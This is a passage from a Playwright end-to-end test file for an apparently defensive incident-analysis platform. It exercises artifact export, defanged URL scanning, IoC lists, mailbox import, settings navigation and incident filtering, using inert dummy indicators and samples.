  const transfer = await page.evaluateHandle(() => {
    const data = new DataTransfer()
    data.items.add(new File(['MZ analysed on its own http://198.51.100.9/stage.bin'], 'again.bin'))
    return data
  })
  await page.dispatchEvent('main', 'dragenter', { dataTransfer: transfer })
  await page.dispatchEvent('main', 'drop', { dataTransfer: transfer })
  await expect(page.getByRole('dialog', { name: 'Add a file' })).toContainText('This file was already analysed.')
  await page.keyboard.press('Escape')
  await page.getByRole('button', { name: 'Incidents', exact: true }).click()
})

test('an artifact is exported: the analyses, and the files only when asked', async () => {
  await page.getByRole('button', { name: 'Artifacts', exact: true }).click()
  const panel = page.getByRole('complementary', { name: 'Artifacts panel' })
  await panel.getByRole('button', { name: /^Export \d+$/ }).click()
  const dialog = page.getByRole('dialog', { name: /^Export / })
  // The original files are live malware: not in the archive unless chosen, each time.
  await expect(dialog.getByRole('radio', { name: /^Analyses only/ })).toBeChecked()
  await expect(dialog).not.toContainText('live malware')
  await dialog.getByRole('radio', { name: /^Analyses and the original files/ }).check()
  await expect(dialog).toContainText('password infected')
  await expect(dialog).toContainText('live malware')
  await dialog.getByRole('radio', { name: /^Analyses only/ }).check()
  const download = page.waitForEvent('download')
  await dialog.getByRole('button', { name: 'Download the archive' }).click()
  expect((await download).suggestedFilename()).toMatch(/^nik-artifacts-\d{4}-\d{2}-\d{2}\.zip$/)
  await expect(dialog).toBeHidden()
  // An admin can bring an archive in.
  await panel.getByRole('button', { name: 'Import' }).click()
  await expect(page.getByRole('dialog', { name: 'Import artifacts' })).toContainText('Nothing is run')
  await page.keyboard.press('Escape')
  await page.getByRole('button', { name: 'Incidents', exact: true }).click()
})

test('an address is scanned on its own, then linked to the incident', async () => {
  if (process.env.E2E_BROWSER_URL) test.setTimeout(180_000)
  await page.getByRole('button', { name: 'Artifacts', exact: true }).click()
  const panel = page.getByRole('complementary', { name: 'Artifacts panel' })
  await panel.getByRole('button', { name: 'New analysis' }).click()
  const dialog = page.getByRole('dialog', { name: 'New analysis' })
  // Addresses on the organisation's network are refused before anything is opened.
  await dialog.getByLabel('or an address to scan').fill('http://192.168.1.10/admin')
  await dialog.getByRole('button', { name: 'Scan address' }).click()
  await expect(dialog.getByRole('alert')).toContainText('Not scanned')
  // Defanged text is understood.
  await dialog.getByLabel('or an address to scan').fill('hxxps://nik-e2e-scan[.]invalid/login')
  await dialog.getByRole('button', { name: 'Scan address' }).click()

  const artifact = page.getByRole('region', { name: 'Artifact' })
  await expect(artifact.getByRole('heading', { name: 'nik-e2e-scan.invalid/login' })).toBeVisible({ timeout: 30_000 })
  await expect(panel.getByRole('navigation', { name: 'Artifacts' })).toContainText('nik-e2e-scan.invalid/login')
  if (process.env.E2E_BROWSER_URL) {
    // The isolated browser visited it: a verdict with its reasons, and the visit's capture.
    await expect(page.getByText('WHY THIS VERDICT')).toBeVisible({ timeout: 120_000 })
    await expect(page.getByText('HOW THE BROWSER GOT THERE')).toBeVisible()
    await expect(artifact).toContainText('browser session')
  } else {
    await expect(page.getByText('The address was not visited.', { exact: true })).toBeVisible({ timeout: 30_000 })
    await expect(page.getByText(/isolated browser is not configured/)).toBeVisible()
  }

  await artifact.getByRole('button', { name: 'Link to incident' }).click()
  await page
    .getByRole('dialog', { name: 'Link to incident' })
    .getByRole('button', { name: 'Link', exact: true })
    .click()
  await artifact.getByRole('button', { name: 'WKS-FINANCE-01 - m.rossi', exact: true }).click()
  await openEvidence('URL Analysis')
  await expect(page.getByRole('list', { name: 'Addresses' })).toContainText('nik-e2e-scan.invalid/login', {
    timeout: 20_000,
  })
  await page.getByRole('button', { name: 'Incidents', exact: true }).click()
})

test('right-click works on lists, indicators and artifacts', async () => {
  const tabs = page.locator('nav[aria-label="Analysis tabs"]')
  const menu = page.getByRole('menu')

  // A sample in the incident's list: its own actions, and the flag.
  await openEvidence('Malware Analysis')
  const samples = page.getByRole('list', { name: 'Samples' })
  await samples.getByText('dropper.bin').click({ button: 'right' })
  await expect(menu).toContainText('Open as an artifact')
  await expect(menu).toContainText('Remove from the incident')
  await menu.getByRole('menuitem', { name: 'Flag the sample' }).click()
  await expect(samples.getByLabel('Flagged')).toHaveCount(1)

  // An indicator is flagged by hand from its menu, wherever it is shown.
  await tabs.getByRole('button', { name: 'Indicators', exact: true }).click()
  const address = page.getByRole('button', { name: '185.220.101.47', exact: true })
  await expect(address).toBeVisible({ timeout: 20_000 })
  // The list reloads after the flag above: a menu closes when the page moves under it.
  await page.waitForLoadState('networkidle')
  await address.click({ button: 'right' })
  await menu.getByRole('menuitem', { name: 'Flag the indicator' }).click()
  await tabs.getByRole('button', { name: 'Summary', exact: true }).click()
  await expect(page.locator('ol li', { hasText: '185.220.101.47' }).first()).toBeVisible()
  await expect(page.locator('ol li', { hasText: 'dropper.bin' }).first()).toBeVisible()
  // A flagged item on the Summary has the menu too.
  await page.locator('ol li', { hasText: 'dropper.bin' }).first().click({ button: 'right' })
  await expect(menu).toContainText('Remove the flag')
  await page.keyboard.press('Escape')

  // An artifact in the panel.
  await page.getByRole('button', { name: 'Artifacts', exact: true }).click()
  const panel = page.getByRole('complementary', { name: 'Artifacts panel' })
  await panel.getByRole('navigation', { name: 'Artifacts' }).getByText('dropper.bin').click({ button: 'right' })
  await expect(menu).toContainText('Copy link')
  await expect(menu).toContainText('Where else was this seen?')
  await page.keyboard.press('Escape')
  await page.getByRole('button', { name: 'Incidents', exact: true }).click()
})

test('pasted text is recognised: an address to scan, an indicator to look up', async () => {
  const paste = (text) =>
    page.evaluate((value) => {
      const data = new DataTransfer()
      data.setData('text/plain', value)
      document.body.dispatchEvent(new ClipboardEvent('paste', { clipboardData: data, bubbles: true }))
    }, text)
  const prompt = page.getByRole('region', { name: 'Pasted text' })

  // Ordinary text is left alone.
  await paste('just some words')
  await expect(prompt).toHaveCount(0)

  // A defanged address: read as it was meant, opened only if the analyst chooses.
  await paste('hxxps://nik-e2e-scan[.]invalid/login')
  await expect(prompt).toContainText('URL')
  await expect(prompt).toContainText('https://nik-e2e-scan.invalid/login')
  await expect(prompt.getByRole('button', { name: 'Analyse URL' })).toBeVisible()
  await prompt.getByRole('button', { name: 'Dismiss' }).click()
  await expect(prompt).toHaveCount(0)

  // An indicator: search it, or see where it was seen.
  await paste('185.220.101[.]47')
  await expect(prompt).toContainText('IP address')
  await prompt.getByRole('button', { name: 'Search in Nik' }).click()
  const palette = page.getByRole('dialog', { name: 'Search' })
  await expect(palette.getByRole('textbox', { name: 'Search' })).toHaveValue('185.220.101.47')
  await page.keyboard.press('Escape')
  await paste('185.220.101.47')
  await prompt.getByRole('button', { name: 'Where seen' }).click()
  await expect(page.getByRole('dialog', { name: 'Indicator' })).toContainText('WKS-FINANCE-01')
  await page.keyboard.press('Escape')
})

test('the IoC library: paste many, group them in a list, export with chosen fields, plan a bulk check', async () => {
  const paste = (text) =>
    page.evaluate((value) => {
      const data = new DataTransfer()
      data.setData('text/plain', value)
      document.body.dispatchEvent(new ClipboardEvent('paste', { clipboardData: data, bubbles: true }))
    }, text)

  // Several values pasted anywhere open "Add indicators" with what Nik read.
  await paste('203.0.113[.]77\nhxxps://nik-e2e-list[.]invalid/get.php\nnot an indicator\n10.12.0.4')
  const add = page.getByRole('dialog', { name: 'Add indicators' })
  const found = add.getByRole('region', { name: 'What Nik found' })
  await expect(found).toContainText('New indicators 3')
  await expect(found).toContainText('Not recognised show1')
  await expect(add.getByLabel('Indicators', { exact: true })).toHaveValue(/203\.0\.113\[\.\]77/)
  // A list is asked for, never assumed.
  await expect(add.getByRole('combobox').first()).toHaveValue('none')
  await add.getByRole('combobox').first().selectOption('new')
  await add.getByLabel('New list name').fill('E2E wave')
  await add.getByLabel('Check them when saved').uncheck()
  await add.getByRole('button', { name: 'Save 3 indicators' }).click()

  // The list opens on its own page, with an address to share.
  await expect(page).toHaveURL(/\/iocs\/lists\/[0-9a-f]{32}$/)
  const table = page.getByRole('table', { name: 'Indicators' })
  await expect(table.locator('tbody tr')).toHaveCount(3)
  await expect(table).toContainText('https://nik-e2e-list.invalid/get.php')
  await expect(table.locator('tbody tr', { hasText: '10.12.0.4' })).toContainText('never sent out')
  const panel = page.getByRole('complementary', { name: 'IoCs panel' })
  await expect(panel.getByRole('button', { name: /E2E wave/ })).toHaveAttribute('aria-current', 'true')
  const listUrl = page.url()

  // Columns sort on the server.
  await table.getByRole('button', { name: 'Value' }).click()
  await expect(table.locator('tbody tr').first()).toContainText('10.12.0.4')

  // Export: the main fields are ticked; the preview follows the choice.
  await page.getByRole('button', { name: 'Export', exact: true }).click()
  const exportDialog = page.getByRole('dialog', { name: /^Export · E2E wave/ })
  const preview = exportDialog.getByLabel('Export preview')
  await expect(preview).toContainText('type,value,verdict,score,tags,first_seen')
  await exportDialog.getByLabel('Lists').check()
  await exportDialog.getByLabel('Defang values').check()
  await expect(preview).toContainText('first_seen,lists')
  await expect(preview).toContainText('203[.]0[.]113[.]77')
  await exportDialog.getByRole('radio', { name: /^Text/ }).check({ force: true })
  await expect(preview).not.toContainText('first_seen')
  const download = page.waitForEvent('download')
  await exportDialog.getByRole('button', { name: /^Download e2e-wave\.txt/ }).click()
  expect((await download).suggestedFilename()).toBe('e2e-wave.txt')

  // Bulk check: what it costs is shown before anything is asked.
  await page.getByRole('button', { name: 'Check all 3' }).click()
  const check = page.getByRole('dialog', { name: /^Check 3 indicators/ })
  await expect(check).toContainText('Never sent out')
  await expect(check.getByRole('button', { name: 'Start' })).toBeVisible()
  await check.getByRole('button', { name: 'Cancel' }).click()

  // The whole library: the incident's indicators are there too, tinted by verdict only.
  await panel.getByRole('button', { name: /^All indicators/ }).click()
  await expect(page).toHaveURL(/\/iocs$/)
  await page.getByLabel('Filter indicators').fill('185.220.101.47')
  const attacker = table.locator('tbody tr', { hasText: '185.220.101.47' }).first()
  await expect(attacker).toContainText('incident')
  await expect(attacker).not.toHaveClass(/bg-high-soft/)

  // A file of indicators dropped anywhere is read as one, and can join a list.
  const transfer = await page.evaluateHandle(() => {
    const data = new DataTransfer()
    data.items.add(new File(['type,value,tags\nip,198.51.100.23,c2\ndomain,nik-e2e-feed.invalid,c2\n'], 'feed.csv'))
    return data
  })
  await page.dispatchEvent('main', 'dragenter', { dataTransfer: transfer })
  await page.dispatchEvent('main', 'drop', { dataTransfer: transfer })
  await expect(add).toContainText('feed.csv')
  await expect(found).toContainText('CSV')
  await expect(found).toContainText('New indicators 2')
  await add.getByRole('combobox').first().selectOption({ label: 'Yes: add to "E2E wave"' })
  await add.getByLabel('Check them when saved').uncheck()
  await add.getByRole('button', { name: 'Save 2 indicators' }).click()
  await expect(page).toHaveURL(listUrl)
  await expect(table.locator('tbody tr')).toHaveCount(5)
  await expect(table.locator('tbody tr', { hasText: '198.51.100.23' })).toContainText('import')

  // The link alone opens the list; an incident leaves the library.
  await page.reload()
  await expect(page.getByRole('heading', { name: /E2E wave/ })).toBeVisible({ timeout: 20_000 })
  await page
    .getByRole('navigation', { name: 'Sections' })
    .getByRole('button', { name: 'Incidents', exact: true })
    .click()
  await page.getByRole('navigation', { name: 'Incidents' }).getByRole('button').first().click()
  await expect(page).toHaveURL(/\/incident\//)
  await expect(page.locator('nav[aria-label="Analysis tabs"]')).toBeVisible()
})

test('the page always follows the address: incident, artifact, library, indicator', async () => {
  const rail = page.getByRole('navigation', { name: 'Sections' })
  const tabs = page.locator('nav[aria-label="Analysis tabs"]')
  const library = page.getByRole('table', { name: 'Indicators' })
  const artifact = page.getByRole('region', { name: 'Artifact' })
  const palette = page.getByRole('dialog', { name: 'Search' })
  const indicator = page.getByRole('dialog', { name: 'Indicator' })
  const openLibrary = async () => {
    if (!(await page.getByRole('complementary', { name: 'IoCs panel' }).count()))
      await rail.getByRole('button', { name: /^IoC library/ }).click()
    await page
      .getByRole('complementary', { name: 'IoCs panel' })
      .getByRole('button', { name: /^All indicators/ })
      .click()
    await expect(page).toHaveURL(/\/iocs$/)
    await expect(library).toBeVisible()
  }
  /** What the main area shows must be what the address says. */
  const expectIncident = async () => {
    await expect(page).toHaveURL(/\/incident\//)
    await expect(tabs).toBeVisible()
    await expect(library).toHaveCount(0)
    await expect(artifact).toHaveCount(0)
  }

  // From the library, an incident found with the search.
  await openLibrary()
  await page.keyboard.press('ControlOrMeta+k')
  await palette.getByRole('textbox', { name: 'Search' }).fill('WKS-FINANCE')
  await palette
    .getByRole('option', { name: /WKS-FINANCE-01/ })
    .first()
    .click()
  await expectIncident()

  // From the library, "go to a tab" of the search.
  await openLibrary()
  await page.keyboard.press('ControlOrMeta+k')
  await palette.getByRole('textbox', { name: 'Search' }).fill('> timeline')
  await page.keyboard.press('Enter')
  await expectIncident()
  await expect(tabs.locator('[aria-current="page"]')).toContainText('Timeline')

  // From the library, the incident an indicator was seen in.
  await openLibrary()
  await page.getByLabel('Filter indicators').fill('185.220.101.47')
  await library.getByRole('button', { name: '185.220.101.47', exact: true }).first().click()
  await indicator
    .getByRole('region', { name: 'Seen in' })
    .getByRole('button', { name: 'Open', exact: true })
    .first()
    .click()
  await expect(indicator).toHaveCount(0)
  await expectIncident()

  // Library, then an artifact, then Back and Forward: each address shows its own page.
  await openLibrary()
  await rail.getByRole('button', { name: 'Artifacts', exact: true }).click()
  await page.getByRole('navigation', { name: 'Artifacts' }).getByRole('button').first().click()
  await expect(page).toHaveURL(/\/artifact\//)
  await expect(artifact).toBeVisible()
  await expect(library).toHaveCount(0)
  await page.goBack()
  await expect(page).toHaveURL(/\/iocs$/)
  await expect(library).toBeVisible()
  await expect(artifact).toHaveCount(0)
  await page.goForward()
  await expect(page).toHaveURL(/\/artifact\//)
  await expect(artifact).toBeVisible()
  await expect(library).toHaveCount(0)

  // From an artifact, an incident found with the search.
  await page.keyboard.press('ControlOrMeta+k')
  await palette.getByRole('textbox', { name: 'Search' }).fill('WKS-FINANCE')
  await palette
    .getByRole('option', { name: /WKS-FINANCE-01/ })
    .first()
    .click()
  await expectIncident()

  // An indicator's page over the library: back to a window keeps it open and restores the address.
  await openLibrary()
  await page.getByLabel('Filter indicators').fill('185.220.101.47')
  await library.getByRole('button', { name: '185.220.101.47', exact: true }).first().click()
  await indicator.getByRole('button', { name: 'Open as a page' }).click()
  await expect(page).toHaveURL(/\/ioc\/ip\?v=185\.220\.101\.47$/)
  await indicator.getByRole('button', { name: 'Back to a window' }).click()
  await expect(page).toHaveURL(/\/iocs$/)
  await expect(indicator).toBeVisible()
  await page.keyboard.press('Escape')
  await expect(library).toBeVisible()

  // Back to the incident for the tests that follow.
  await rail.getByRole('button', { name: 'Incidents', exact: true }).click()
  await page.getByRole('navigation', { name: 'Incidents' }).getByRole('button').first().click()
  await expectIncident()
})

test('an indicator and the artifact that is its analysis lead to each other', async () => {
  const rail = page.getByRole('navigation', { name: 'Sections' })
  const artifact = page.getByRole('region', { name: 'Artifact' })
  const indicator = page.getByRole('dialog', { name: 'Indicator' })

  // The artifact as an indicator: its value and what the sources say about it.
  await rail.getByRole('button', { name: 'Artifacts', exact: true }).click()
  const panel = page.getByRole('complementary', { name: 'Artifacts panel' })
  await panel
    .getByRole('navigation', { name: 'Artifacts' })
    .getByRole('button', { name: /dropper\.bin/ })
    .click()
  await expect(artifact).toContainText('AS AN INDICATOR')
  await expect(artifact).toContainText(/Reputation: (not checked|\w+ \d+)/)

  // From the indicator back to the analysis Nik made of it.
  await artifact
    .getByRole('button', { name: /^[0-9a-f]{64}$/ })
    .first()
    .click()
  const analysed = indicator.getByRole('region', { name: 'Analysed by Nik' })
  await expect(analysed).toContainText('Analysis · what Nik saw')
  await expect(indicator).toContainText('Reputation · what the sources say')
  // The artifact is on its own or in the incident: either way "Seen in" names it.
  await expect(indicator.getByRole('region', { name: 'Seen in' })).toContainText(/dropper\.bin|file:/)
  await analysed.getByRole('button', { name: 'Open the analysis' }).click()
  await expect(indicator).toHaveCount(0)
  await expect(page).toHaveURL(/\/artifact\/file-[0-9a-f]{64}$/)
  await expect(artifact.getByRole('heading', { name: 'dropper.bin' })).toBeVisible()

  // An address not analysed yet: the page and the right-click menu offer to analyse it.
  await rail.getByRole('button', { name: /^IoC library/ }).click()
  const library = page.getByRole('table', { name: 'Indicators' })
  await page
    .getByRole('complementary', { name: 'IoCs panel' })
    .getByRole('button', { name: /^Addresses to analyse/ })
    .click()
  await expect(library.locator('tbody tr').first()).toContainText('not analysed')
  const address = library.getByRole('button', { name: /^https?:\/\// }).first()
  await address.click({ button: 'right' })
  await expect(page.getByRole('menu').getByRole('menuitem', { name: /^Analyse URL/ })).toBeVisible()
  await page.keyboard.press('Escape')
  await address.click()
  await expect(indicator.getByRole('region', { name: 'Analysed by Nik' })).toContainText('Not analysed by Nik yet')
  await expect(indicator.getByRole('button', { name: 'Analyse URL' })).toBeVisible()
  await page.keyboard.press('Escape')

  // Several at once: what would be visited is shown first, and nothing is visited until confirmed.
  await page.getByLabel('Select the page').check()
  await page.getByRole('region', { name: 'Selection' }).getByRole('button', { name: 'Analyse addresses' }).click()
  const plan = page.getByRole('dialog', { name: 'Analyse addresses' })
  await expect(plan).toContainText('A visit is seen by the site')
  await expect(plan.getByRole('button', { name: /^Visit \d+ address/ })).toBeVisible()
  await plan.getByRole('button', { name: 'Cancel' }).click()

  await rail.getByRole('button', { name: 'Incidents', exact: true }).click()
  await page.getByRole('navigation', { name: 'Incidents' }).getByRole('button').first().click()
  await expect(page).toHaveURL(/\/incident\//)
})

test('a mailbox is indexed, its messages imported, and its conversations drawn as a graph', async () => {
  test.setTimeout(180_000)
  const rail = page.getByRole('navigation', { name: 'Sections' })
  const artifact = page.getByRole('region', { name: 'Artifact' })
  const mail = (id, subject, from, date, reply) =>
    [
      'From sender@example.org Tue Nov 10 08:31:00 2026',
      `From: ${from}`,
      'To: finance@example.org',
      `Subject: ${subject}`,
      `Date: ${date}`,
      `Message-ID: <${id}@nik-e2e.example>`,
      ...(reply ? [`In-Reply-To: <${reply}@nik-e2e.example>`] : []),
      '',
      'Please see the invoice.',
      '>From the accounts team',
      '',
    ].join('\n')
  const mbox = [
    mail('q1', 'Quarterly invoice', 'billing@nik-e2e-vendor.example', 'Tue, 10 Nov 2026 08:31:00 +0000'),
    mail('q2', 'Re: Quarterly invoice', 'finance@example.org', 'Wed, 11 Nov 2026 09:00:00 +0000', 'q1'),
    mail('q3', 'Fwd: Quarterly invoice', 'colleague@example.org', 'Wed, 11 Nov 2026 10:00:00 +0000', 'q1'),
  ].join('\n')

  // Dropped anywhere, an mbox becomes a mailbox artifact: indexed, nothing analysed yet.
  const transfer = await page.evaluateHandle((text) => {
    const data = new DataTransfer()
    data.items.add(new File([text], 'team.mbox'))
    return data
  }, mbox)
  await page.dispatchEvent('main', 'dragenter', { dataTransfer: transfer })
  await page.dispatchEvent('main', 'drop', { dataTransfer: transfer })
  await expect(page).toHaveURL(/\/artifact\/mailbox-[0-9a-f]{32}$/, { timeout: 30_000 })
  await expect(artifact).toContainText('team.mbox')
  await expect(artifact).toContainText('Nothing imported yet', { timeout: 30_000 })
  await expect(artifact).toContainText('0 of 3 messages imported')

  // The import says what it will take before taking it.
  await artifact.getByRole('button', { name: 'Import messages' }).first().click()
  const dialog = page.getByRole('dialog', { name: 'Import from team.mbox' })
  await expect(dialog.getByRole('status', { name: 'Import plan' })).toContainText('3 messages match')
  await dialog.getByLabel('Sender or domain').fill('nik-e2e-vendor.example')
  await expect(dialog.getByRole('status', { name: 'Import plan' })).toContainText(
    '1 message matches · 3 with their conversations',
  )
  await dialog.getByRole('button', { name: 'Import 3 messages' }).click()

  // The graph: a row per message, newest first, each imported one with its verdict.
  const rows = artifact.getByRole('list', { name: 'Messages' }).getByRole('listitem')
  await expect(rows).toHaveCount(3, { timeout: 120_000 })
  await expect(artifact).toContainText('3 of 3 messages imported', { timeout: 120_000 })
  await expect(rows.first()).toContainText('Fwd: Quarterly invoice')
  await expect(rows.last()).toContainText('Quarterly invoice')
  await expect(rows.last()).not.toContainText('not imported')

  // A row shows the message and what it answers; the e-mail opens as its own artifact.
  await rows
    .nth(1)
    .getByRole('button', { name: /Re: Quarterly invoice/ })
    .click()
  const detail = artifact.getByRole('complementary', { name: 'Message' })
  await expect(detail).toContainText('finance@example.org')
  await expect(detail.getByRole('button', { name: 'Quarterly invoice', exact: true })).toBeVisible()
  await detail.getByRole('button', { name: 'Open the e-mail' }).click()
  await expect(page).toHaveURL(/\/artifact\/mail-[0-9a-f]{64}$/)
  await page.goBack()
  await expect(page).toHaveURL(/\/artifact\/mailbox-[0-9a-f]{32}$/)
  await expect(rows).toHaveCount(3)

  // All of them, or the ticked ones, go in an incident.
  await rows.first().getByRole('checkbox').check()
  await artifact.getByRole('button', { name: 'Put 1 in an incident' }).click()
  const link = page.getByRole('dialog', { name: 'Put messages in an incident' })
  await expect(link).toContainText('Only the phishing and suspicious ones add indicators')
  await link.getByRole('button', { name: 'Put the 1 selected' }).click()
  await expect(page.getByText(/1 message is in /)).toBeVisible()

  await rail.getByRole('button', { name: 'Incidents', exact: true }).click()
  await page.getByRole('navigation', { name: 'Incidents' }).getByRole('button').first().click()
  await expect(page).toHaveURL(/\/incident\//)
})

test('Storage shows how full the disk is and what fills it', async () => {
  await page.getByRole('button', { name: 'Open platform settings' }).click()
  const settings = page.getByRole('region', { name: 'Settings' })
  await settings.getByRole('navigation', { name: 'Settings sections' }).getByText('Storage').click()
  await expect(settings.getByRole('img', { name: /% of the disk is used/ })).toBeVisible()
  const use = settings.getByRole('table', { name: 'Disk use' })
  await expect(use).toContainText('Mailboxes')
  await expect(use).toContainText('Database')
  await expect(use).toContainText('Everything else on the disk')
  await expect(settings.getByRole('list', { name: 'Largest objects' })).toContainText('team.mbox')
  await page.keyboard.press('Escape')
  await expect(settings).toBeHidden()
})

test('Settings is a page: every section has an address, Back leaves it, a link opens it', async () => {
  const before = new URL(page.url()).pathname
  const gear = page.getByRole('button', { name: 'Open platform settings' })
  await gear.click()
  const settings = page.getByRole('region', { name: 'Settings' })
  const sections = settings.getByRole('navigation', { name: 'Settings sections' })
  await expect(page).toHaveURL(/\/settings\/analysis\/detection-rules$/)
  // The sections are in groups; the one shown is marked.
  await expect(sections.getByRole('group')).toHaveCount(8)
  await expect(sections.getByRole('group', { name: 'Rule sets' }).getByRole('button')).toHaveText([
    'YARA rules',
    'capa rules',
    'FLIRT signatures',
    'Script signatures',
  ])
  await expect(sections.getByRole('button', { name: 'Detection rules' })).toHaveAttribute('aria-current', 'page')
  // The rail shows the page is open; what was open under it is not shown.
  await expect(page.getByRole('button', { name: 'Close platform settings' })).toHaveAttribute('aria-pressed', 'true')
  await expect(page.locator('nav[aria-label="Analysis tabs"]')).toBeHidden()

  // The box narrows the sections by name and by keyword.
  const find = settings.getByRole('searchbox', { name: 'Find a setting' })
  await find.fill('password')
  await expect(sections.getByRole('button')).toHaveText(['My account'])
  await find.fill('restore')
  await expect(sections.getByRole('button')).toHaveText(['Backup'])
  await find.fill('zzz')
  await expect(sections.getByRole('status')).toContainText('No section matches')
  await find.fill('')

  // A section has its address; the full backup is one of them.
  await sections.getByRole('button', { name: 'Backup' }).click()
  await expect(page).toHaveURL(/\/settings\/system\/backup$/)
  await expect(settings.getByRole('button', { name: 'Export full backup' })).toBeVisible()
  await sections.getByRole('button', { name: 'Audit log' }).click()
  await expect(page).toHaveURL(/\/settings\/system\/audit-log$/)

  // Back leaves the page in one step, wherever one went inside it; Forward returns to the section.
  await page.goBack()
  await expect(settings).toHaveCount(0)
  expect(new URL(page.url()).pathname).toBe(before)
  await expect(page.locator('nav[aria-label="Analysis tabs"]')).toBeVisible()
  await page.goForward()
  await expect(settings.getByRole('heading', { name: 'Audit log', level: 2 })).toBeVisible()

  // The address is a link: a reload stays on the section.
  await page.reload()
  await expect(settings.getByRole('heading', { name: 'Audit log', level: 2 })).toBeVisible()
  await expect(sections.getByRole('button', { name: 'Audit log' })).toHaveAttribute('aria-current', 'page')
  // An older or shortened address still opens the page.
  await page.goto('/settings/accounts')
  await expect(settings.getByRole('heading', { name: 'Accounts', level: 2 })).toBeVisible()

  // Closing a page opened by its link goes to the start; an entry of the rail leaves it too.
  await settings.getByRole('button', { name: 'Close settings' }).click()
  await expect(settings).toHaveCount(0)
  await gear.click()
  await page.getByRole('navigation', { name: 'Sections' }).getByRole('button', { name: 'Incidents' }).click()
  await expect(settings).toHaveCount(0)
  await page.goto(before)
  await expect(page.locator('nav[aria-label="Analysis tabs"]')).toBeVisible()
})

test('an incident has a status and an assignee, set from the panel and filtered there', async () => {
  const panel = page.locator('aside[aria-label="Incidents panel"]')
  const list = panel.locator('nav[aria-label="Incidents"]')
  const row = list.locator('li', { hasText: 'WKS-FINANCE-01' })
  const menu = page.getByRole('menu')

  // From the right-click menu of the panel.
  await row.click({ button: 'right' })
  await menu.getByRole('menuitem', { name: 'Assign to me' }).click()
  await expect(row).toContainText('@admin')
  await row.click({ button: 'right' })
  await menu.getByRole('menuitem', { name: 'Mark as in progress' }).click()
  await expect(row).toContainText('in progress')

  // The Summary shows the same and saves a change; the header follows.
  await row.getByRole('button').first().click()
  await page.locator('nav[aria-label="Analysis tabs"]').getByRole('button', { name: 'Summary', exact: true }).click()
  const details = page.getByRole('article', { name: 'Incident details' })
  await expect(details).toContainText('in progress')
  await expect(details).toContainText('admin')
  await expect(page.getByRole('banner')).toContainText('assigned to admin')
  // The incident itself is changed in its own form, which the details open.
  await details.getByRole('button', { name: 'Edit the incident' }).click()
  const editing = page.getByRole('dialog', { name: 'Edit the incident' })
  await expect(editing.locator('#incident-status')).toHaveValue('in_progress')
  await expect(editing.locator('#incident-assignee')).toHaveValue('admin')
  // The operating system of the host is optional: the one chosen is let go by choosing it again.
  const system = editing.getByRole('group', { name: /^Host operating system/ })
  const linux = system.getByRole('button', { name: 'Linux' })
  await linux.click()
  await expect(linux).toHaveAttribute('aria-pressed', 'true')
  await linux.click()
  await expect(system.locator('[aria-pressed="true"]')).toHaveCount(0)
  await editing.locator('#incident-status').selectOption('closed')
  await editing.getByRole('button', { name: 'Save', exact: true }).click()
  // Closing asks how: a reason among those of the incident's type, and notes.
  const closing = page.getByRole('dialog', { name: 'Close the incident' })
  await expect(closing).toContainText('Unclassified')
  await closing.locator('#close-reason').selectOption('False positive')
  await closing.locator('#close-notes').fill('A test of the scanner.')
  await closing.getByRole('button', { name: 'Close the incident' }).click()
  await expect(closing).toHaveCount(0)
  await expect(row).toContainText('closed')
  await expect(details).toContainText('closed')
  await expect(details).toContainText('not set')

  // The filters of the panel.
  await panel.getByLabel('Status filter').selectOption('open')
  await expect(row).toHaveCount(0)
  await panel.getByLabel('Status filter').selectOption('closed')
  await expect(row).toHaveCount(1)
  await panel.getByRole('button', { name: 'mine' }).click()
  await expect(row).toHaveCount(1)
  await row.click({ button: 'right' })
  await menu.getByRole('menuitem', { name: 'Remove the assignee (admin)' }).click()
  await expect(list).toContainText('No incident matches the filters.')
  await panel.getByRole('button', { name: 'mine' }).click()
  await panel.getByLabel('Status filter').selectOption('all')
  await row.click({ button: 'right' })
  await menu.getByRole('menuitem', { name: 'Mark as open' }).click()
  await expect(row).not.toContainText('closed')
})

test('a query filters the lists: typed, completed, built from rows; the filters write it', async () => {
  const panel = page.locator('aside[aria-label="Incidents panel"]')
  const list = panel.locator('nav[aria-label="Incidents"]')
  const filter = panel.getByRole('combobox', { name: 'Filter incidents' })
  const status = panel.getByLabel('Status filter')

  // Plain words, then a field with a wildcard: the server reads the query.
  await filter.fill('wks-finance')
  await expect(list.locator('li')).toHaveCount(1)
  await expect(list).toContainText('WKS-FINANCE-01')
  await filter.fill('host:nowhere-*')
  await expect(list).toContainText('No incident matches the filters.')
  await filter.fill('host:wks-* -host:nowhere')
  await expect(list).toContainText('WKS-FINANCE-01')

  // Autocomplete: the fields at the start of a condition, the values after the colon.
  await filter.fill('')
  await filter.pressSequentially('stat')
  const suggestions = panel.getByRole('listbox', { name: 'Suggestions' })
  await expect(suggestions.getByRole('option')).toHaveCount(1)
  await expect(suggestions.getByRole('option').first()).toContainText('status')
  await page.keyboard.press('Enter')
  await expect(filter).toHaveValue('status:')
  await expect(suggestions.getByRole('option')).toHaveText(['open', 'in_progress', 'closed'])
  await page.keyboard.press('ArrowDown')
  await page.keyboard.press('ArrowDown')
  await page.keyboard.press('Tab')
  await expect(filter).toHaveValue('status:closed ')
  await expect(filter).toBeFocused()
  // The status picker shows what the query says, and writes into it; so does "mine".
  await expect(status).toHaveValue('closed')
  await status.selectOption('open')
  await expect(filter).toHaveValue('status:open')
  await panel.getByRole('button', { name: 'mine' }).click()
  await expect(filter).toHaveValue(`status:open owner:${ADMIN.username}`)
  await expect(panel.getByRole('button', { name: 'mine' })).toHaveAttribute('aria-pressed', 'true')

  // The builder: the same query as rows; a change of a row rewrites the text.
  await panel.getByRole('button', { name: 'Query builder' }).click()
  await expect(panel.getByLabel('Condition 1: field')).toHaveValue('status')
  await expect(panel.getByLabel('Condition 2: field')).toHaveValue('owner')
  await panel.getByLabel('Condition 1: value').selectOption('closed')
  await expect(filter).toHaveValue(`status:closed owner:${ADMIN.username}`)
  await panel.getByRole('button', { name: 'Remove Condition 2' }).click()
  await expect(filter).toHaveValue('status:closed')
  await panel.getByRole('button', { name: 'Add a condition' }).click()
  await panel.getByLabel('Condition 2: field').selectOption('severity')
  await panel.getByLabel('Condition 2: operator').selectOption('>=')
  await panel.getByLabel('Condition 2: value').selectOption('high')
  await expect(filter).toHaveValue('status:closed severity:>=high')
  await panel.getByLabel('How the conditions combine').selectOption('or')
  await expect(filter).toHaveValue('status:closed or severity:>=high')
  // What it cannot show, it says; the text stays the query.
  await filter.fill('-(wks or srv)')
  await expect(panel.getByText('Edit it as text.')).toBeVisible()
  await panel.getByRole('button', { name: 'Query builder' }).click()

